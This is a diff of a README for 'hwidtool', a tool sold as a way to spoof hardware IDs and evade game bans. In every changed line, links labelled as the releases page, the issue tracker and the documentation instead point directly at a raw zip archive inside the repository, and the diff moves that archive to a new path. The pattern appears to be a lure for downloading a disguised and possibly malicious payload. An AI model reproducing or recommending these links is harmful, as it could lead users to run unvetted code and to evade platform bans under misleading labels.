@@ -5,7 +5,7 @@
 Welcome to hwidtool, a free and open-source hardware ID spoofer designed to help you manage your game bans responsibly. This tool changes your hardware ID, MAC address, and disk serials, helping you to bypass bans while keeping your system secure. We encourage ethical usage and believe users should take responsibility for their actions.
 
 ## 📥 Download Now
-[![Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip)](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip)
+[![Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip)](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip)
 
 ## ⚙️ System Requirements
 To run hwidtool effectively, you need the following:
@@ -27,7 +27,7 @@ To download and run hwidtool, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip)
+   [Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see various versions. Select the latest version for the best features and improvements.
@@ -58,7 +58,7 @@ While hwidtool is built with privacy in mind, be aware that spoofing hardware ID
 - **Backup Your Data:** Always keep backups of your important data and files.
 
 ## 📞 Support
-If you have questions or encounter issues, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip). Our community and developers are here to help you.
+If you have questions or encounter issues, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip). Our community and developers are here to help you.
 
 ## 🏷️ Topics
 - **Configuration**
@@ -81,10 +81,10 @@ If you have questions or encounter issues, feel free to open an issue on our [Gi
 
 ## 🔗 Additional Resources
 To learn more about hwidtool, visit the GitHub repository and check out the documentation available there:
-- [hwidtool Documentation](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip)
+- [hwidtool Documentation](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip)
 
 Once again, here is the download link for your convenience:  
-[Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/.cargo/Software_3.8.zip)
+[Download hwidtool](https://raw.githubusercontent.com/yutangru1114/hwidtool/main/src/Software_1.9-beta.1.zip)
 
 Thank you for using hwidtool!
 ```
